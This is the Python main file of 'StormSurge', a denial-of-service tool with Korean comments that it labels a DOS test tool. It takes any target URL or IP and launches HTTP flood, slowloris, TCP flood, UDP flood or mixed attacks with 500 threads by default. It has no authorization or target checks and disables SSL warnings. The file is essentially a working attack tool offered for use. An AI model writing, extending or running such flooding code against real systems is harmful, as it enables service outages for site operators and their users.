#!/usr/bin/env python3
"""
stormsurge.py - 강력한 DOS 테스트 툴의 메인 실행 파일
"""

import os
import sys
import time
import argparse
import threading
import signal
import socket
import ssl
import random
from typing import Dict, List, Any, Optional

# 내부 모듈 임포트
from core.network import NetworkHandler
from core.async_engine import AsyncEngine
from core.thread_manager import ThreadManager
from vectors.http_flood import HTTPFlood
from vectors.slowloris import Slowloris
from vectors.tcp_flood import TCPFlood
from vectors.udp_flood import UDPFlood
from vectors.mixed_attack import MixedAttack
from ui.terminal import TerminalUI
from ui.progress import ProgressTracker
from utils.useragents import UserAgentManager
from utils.headers import HeaderManager
from utils.logger import Logger


class StormSurge:
    """StormSurge 메인 클래스"""
    
    def __init__(self):
        """StormSurge 초기화"""
        self.ui = TerminalUI()
        self.network = NetworkHandler()
        self.user_agents = UserAgentManager()
        self.header_manager = HeaderManager()
        self.logger = Logger()
        self.tracker = ProgressTracker(self.ui.show_progress)
        self.running = False
        self.target_info = {}
        self.attack_type = ""
        self.duration_ms = None
        
        # 시그널 핸들러 등록
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        """시그널 핸들러"""
        print("\n")
        self.ui.show_warning("사용자에 의해 중단되었습니다.")
        self.stop_attack()
        sys.exit(0)
    
    def parse_arguments(self):
        """명령줄 인자 파싱"""
        parser = argparse.ArgumentParser(
            description="StormSurge - 강력한 DOS 테스트 툴",
            formatter_class=argparse.RawTextHelpFormatter
        )
        
        parser.add_argument("-s", "--server", required=True, help="대상 URL 또는 IP 주소")
        parser.add_argument("-t", "--time", type=int, help="공격 지속 시간 (밀리초)")
        parser.add_argument("-m", "--mode", default="mixed", choices=["http", "slowloris", "tcp", "udp", "mixed"],
                          help="공격 모드 (기본값: mixed)")
        parser.add_argument("-p", "--port", type=int, help="대상 포트 (기본값: 프로토콜에 따라 자동 설정)")
        parser.add_argument("-th", "--threads", type=int, default=500, help="스레드 수 (기본값: 500)")
        parser.add_argument("-v", "--verbose", action="store_true", help="상세 출력 모드")
        
        args = parser.parse_args()
        
        # 대상 정보 파싱
        self.target_info = self.network.parse_target(args.server)
        
        # 포트 설정
        if args.port:
            self.target_info['port'] = args.port
        
        # 공격 유형 설정
        self.attack_type = args.mode
        
        # 지속 시간 설정
        self.duration_ms = args.time
        
        # 스레드 수 설정
        self.threads = args.threads
        
        # 상세 출력 모드 설정
        if args.verbose:
            self.logger.log_level = logging.DEBUG
            self.logger._setup_logger()
        
        return args
    
    def start_attack(self):
        """공격 시작"""
        self.running = True
        
        # 배너 표시
        self.ui.show_banner()
        
        # 대상 정보 표시
        self.ui.show_target_info(self.target_info)
        
        # 공격 시작 메시지 표시
        self.ui.show_attack_start(self.attack_type, self.duration_ms)
        
        # 로깅 시작
        self.logger.start_attack(self.target_info, self.attack_type, self.duration_ms)
        
        # 진행 상황 추적 시작
        self.tracker.start(self.duration_ms)
        
        # 공격 스레드 시작
        attack_thread = threading.Thread(target=self._attack_worker)
        attack_thread.daemon = True
        attack_thread.start()
        
        try:
            # 메인 스레드는 진행 상황 업데이트
            while self.running:
                time.sleep(0.5)
                
                # 지속 시간 확인
                if self.duration_ms is not None:
                    elapsed = time.time() - self.tracker.start_time
                    if elapsed * 1000 >= self.duration_ms:
                        self.running = False
                        break
        
        except KeyboardInterrupt:
            self.ui.show_warning("사용자에 의해 중단되었습니다.")
            self.running = False
        
        finally:
            # 공격 종료
            self.stop_attack()
            
            # 최종 결과 표시
            final_stats = self.tracker.get_final_stats()
            self.ui.show_result(final_stats, self.attack_type)
            
            # 로깅 종료
            self.logger.end_attack(final_stats)
    
    def stop_attack(self):
        """공격 중지"""
        self.running = False
        self.tracker.stop()
    
    def _attack_worker(self):
        """공격 작업자 스레드"""
        try:
            # 사용자 에이전트 및 헤더 준비
            user_agent = self.user_agents.get_random()
            headers = self.header_manager.generate_headers(self.target_info['host'], user_agent)
            
            # 공격 유형에 따라 다른 공격 수행
            if self.attack_type == "http":
                self._http_flood_attack(headers)
            elif self.attack_type == "slowloris":
                self._slowloris_attack()
            elif self.attack_type == "tcp":
                self._tcp_flood_attack()
            elif self.attack_type == "udp":
                self._udp_flood_attack()
            elif self.attack_type == "mixed":
                self._mixed_attack(headers)
            
        except Exception as e:
            self.logger.log_error("공격 중 오류 발생", e)
            self.ui.show_error(f"공격 중 오류 발생: {str(e)}")
            self.running = False
    
    def _http_flood_attack(self, headers: Dict[str, str]):
        """HTTP 플러딩 공격"""
        http_flood = HTTPFlood(self.target_info, headers)
        thread_manager = ThreadManager(max_threads=self.threads)
        thread_manager.initialize()
        
        # HTTP 플러딩 시작
        thread_manager.http_flood(
            self.target_info['url'],
            headers,
            method='GET',
            duration_ms=self.duration_ms
        )
        
        # 통계 업데이트 루프
        while self.running:
            stats = thread_manager.get_stats()
            self.tracker.update_stats({
                'requests_sent': stats['success_count'],
                'bytes_sent': stats['success_count'] * 1024  # 대략적인 바이트 수
            })
            self.logger.log_progress(self.tracker.stats)
            time.sleep(1)
        
        # 종료
        thread_manager.shutdown()
    
    def _slowloris_attack(self):
        """슬로우로리스 공격"""
        slowloris = Slowloris(self.target_info)
        
        # 슬로우로리스 시작
        result = slowloris.attack(
            max_sockets=self.threads,
            duration_ms=self.duration_ms
        )
        
        # 통계 업데이트
        self.tracker.update_stats({
            'sockets_created': result['sockets_created']
        })
    
    def _tcp_flood_attack(self):
        """TCP 플러딩 공격"""
        tcp_flood = TCPFlood(self.target_info)
        thread_manager = ThreadManager(max_threads=self.threads)
        thread_manager.initialize()
        
        # TCP 플러딩 시작
        thread_manager.tcp_flood(
            self.target_info['host'],
            self.target_info['port'],
            duration_ms=self.duration_ms
        )
        
        # 통계 업데이트 루프
        while self.running:
            stats = thread_manager.get_stats()
            self.tracker.update_stats({
                'packets_sent': stats['success_count'],
                'bytes_sent': stats['success_count'] * 1024  # 대략적인 바이트 수
            })
            self.logger.log_progress(self.tracker.stats)
            time.sleep(1)
        
        # 종료
        thread_manager.shutdown()
    
    def _udp_flood_attack(self):
        """UDP 플러딩 공격"""
        udp_flood = UDPFlood(self.target_info)
        thread_manager = ThreadManager(max_threads=self.threads)
        thread_manager.initialize()
        
        # UDP 플러딩 시작
        thread_manager.udp_flood(
            self.target_info['host'],
            self.target_info['port'],
            duration_ms=self.duration_ms
        )
        
        # 통계 업데이트 루프
        while self.running:
            stats = thread_manager.get_stats()
            self.tracker.update_stats({
                'packets_sent': stats['success_count'],
                'bytes_sent': stats['success_count'] * 1024  # 대략적인 바이트 수
            })
            self.logger.log_progress(self.tracker.stats)
            time.sleep(1)
        
        # 종료
        thread_manager.shutdown()
    
    def _mixed_attack(self, headers: Dict[str, str]):
        """다중 공격 벡터"""
        mixed_attack = MixedAttack(self.target_info, headers)
        
        # 공격 가중치 설정
        attack_weights = {
            'http': 0.4,    # HTTP 플러딩 (40%)
            'slowloris': 0.2,  # 슬로우로리스 (20%)
            'tcp': 0.2,     # TCP 플러딩 (20%)
            'udp': 0.2      # UDP 플러딩 (20%)
        }
        
        # 다중 공격 시작
        result = mixed_attack.attack(
            duration_ms=self.duration_ms,
            thread_count=self.threads,
            attack_weights=attack_weights
        )
        
        # 통계 업데이트
        self.tracker.update_stats(result)


if __name__ == "__main__":
    # SSL 경고 무시
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # 로깅 모듈 임포트
    import logging
    
    # StormSurge 인스턴스 생성 및 실행
    storm = StormSurge()
    storm.parse_arguments()
    storm.start_attack()
